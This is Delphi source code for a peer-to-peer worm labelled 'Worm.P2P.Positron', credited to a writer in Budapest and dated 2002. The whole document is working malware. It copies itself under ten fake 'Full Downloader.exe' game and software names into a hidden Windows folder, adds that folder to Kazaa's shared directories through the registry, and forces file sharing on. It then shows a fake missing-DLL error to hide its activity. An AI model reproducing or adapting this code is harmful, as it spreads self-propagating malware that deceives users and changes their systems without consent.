   //****************************************************************************//
   //      Virus:      Worm.P2P.Positron                                         //
   //      Writer:     Positron/HVX                                              //
   //      Origin:     Budapest, Hungary                                         //
   //      Finished:   July/2002                                                 //
   //****************************************************************************//

   UNIT Worm;

   INTERFACE

   USES
     Windows, SysUtils, Forms, Registry;

   TYPE
     TForm1 = CLASS(TForm)
     PROCEDURE FormCreate(Sender: TObject);
     PRIVATE
       { Private declarations }
     PUBLIC
       { Public declarations }
     END;

   VAR
     Form1    : TForm1;
     Reg      : TRegistry;
     I        : Longint;

   IMPLEMENTATION

   {$R *.DFM}

   FUNCTION WinPath : STRING;
   VAR
     PWindowsDir: ARRAY [0..255] OF Char;
   BEGIN
     GetWindowsDirectory(PWindowsDir,255);
     Result:=StrPas(PWindowsDir)+'\';
   END;

   FUNCTION FindKazaa : Boolean;
   BEGIN
     Reg.RootKey:=HKEY_CURRENT_USER;
     Result:=Reg.KeyExists('\Software\Kazaa\LocalContent');
     Reg.CloseKey;
   END;

   PROCEDURE MakeFakeFiles;
   CONST FakeFiles : ARRAY[1..10] OF STRING = (
                                'The Neverending Story Part I Full Downloader.exe',
                                'Warcraft III Full Downloader.exe',
                                'Hitler Song Full Downloader.exe',
                                'The Sun Of All Fears Full Downloader.exe',
                                'Crazy Taxi Full Downloader.exe',
                                'Duke Nukem Manhattan Project Full Downloader.exe',
                                'Industry Giant II Full Downloader.exe',
                                'F1 Grand Pix 4 Full Downloader.exe',
                                'Star Wars II Movie Full Downloader.exe',
                                'Nero Burning Rom 5.5.9.3 Full Downloader.exe');
   BEGIN
     CreateDir(winpath+'SysConfig');
     FOR i:=1 TO 10 DO Windows.CopyFile(pchar(ParamStr(0)),pChar(WinPath+'SysConfig\'+FakeFiles[i]),False);
   END;

   PROCEDURE KazaRegistry;
   VAR
     s : STRING;
   BEGIN
     Reg.RootKey:=HKEY_CURRENT_USER;
     Reg.OpenKey('\Software\Kazaa\LocalContent',False);
     REPEAT
       Str(i,s);
       s:='Dir'+s;
       Inc(i);
     UNTIL Reg.ReadString(s)='';
     Reg.WriteString(s,'012345:'+WinPath+'SysConfig');    // <- Create Dir to Fake Files
     Reg.WriteInteger('DisableSharing',0);                // <- Enable File Sharing
     Reg.CloseKey;
   END;

   FUNCTION FirstRun: boolean;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     result:= NOT Reg.Keyexists('\Software\Positron');
     IF result THEN Reg.CreateKey('\Software\Positron');
     Reg.CloseKey;
   END;

   PROCEDURE TForm1.FormCreate(Sender: TObject);
   BEGIN
     Reg := TRegistry.Create;
     IF FirstRun THEN BEGIN
       KazaRegistry;
       MakeFakeFiles;
     END;
     Application.MessageBox('QTINTF3.DLL Not Found!','Error',MB_ICONHAND);
     Reg.Free;
     Form1.Close;
     Halt;
   END;

   END.
